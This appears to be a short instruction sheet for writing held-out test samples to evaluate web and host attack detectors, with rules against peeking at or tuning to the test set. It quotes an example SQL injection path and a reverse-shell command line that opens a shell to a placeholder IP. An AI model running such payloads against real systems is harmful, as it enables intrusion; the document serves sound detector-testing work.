# For the teammate who writes independent test samples (30 minutes)

Do NOT open detector/web_guard.py or detector/host_guard.py before you write these: the point is that you do not know what the rules look for.
Write what you would try if you were attacking a website or a Linux machine (use OWASP cheat sheets, PayloadsAllTheThings, your own ideas), and also
normal things real people do. One sample per line, 30+ lines per file is good. Lines starting with # are ignored.

| File | What to write |
|---|---|
| sqli.txt | request paths with SQL injection, e.g. `/item?id=1' OR 1=1--` |
| xss.txt | request paths with cross-site scripting |
| traversal.txt | request paths that try to read files outside the web folder |
| cmdinj.txt | request paths with command injection / log4shell |
| benign_web.txt | NORMAL request paths (searches, product pages, names with apostrophes, API calls, pages about SQL or security) |
| shell.txt | reverse-shell command lines, then a TAB, then the program path: `bash -i >& /dev/tcp/1.2.3.4/4444 0>&1<TAB>/usr/bin/bash` |
| miner.txt | crypto-miner command lines + TAB + program path |
| benign_host.txt | NORMAL command lines + TAB + program path (admin and developer work, including tools like nc, ssh, openssl) |

Then run `python3 eval/heldout_round2.py` and send the file eval/results/ROUND2_RESULTS.md to the team. Rows marked "teammate" are the independent numbers.
Do not tune the rules to fix your misses and then quote the same numbers: if rules change, write a NEW set of samples for the re-test.
